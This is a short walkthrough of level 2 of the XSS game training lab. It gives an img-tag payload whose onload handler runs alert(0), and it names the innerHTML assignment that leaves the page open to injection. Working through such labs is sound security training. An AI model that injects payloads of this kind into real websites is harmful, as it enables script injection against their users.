## Level 2

* Payload:

```html
<img src="https://xss-game.appspot.com/static/level2_icon.png" onload="alert(0)">
```

* "sanitation" happends in `index.html` line 32:

```javascript
containerEl.innerHTML += html;
```

* **Using innerHTML will NOT allow rendering of script tags!!**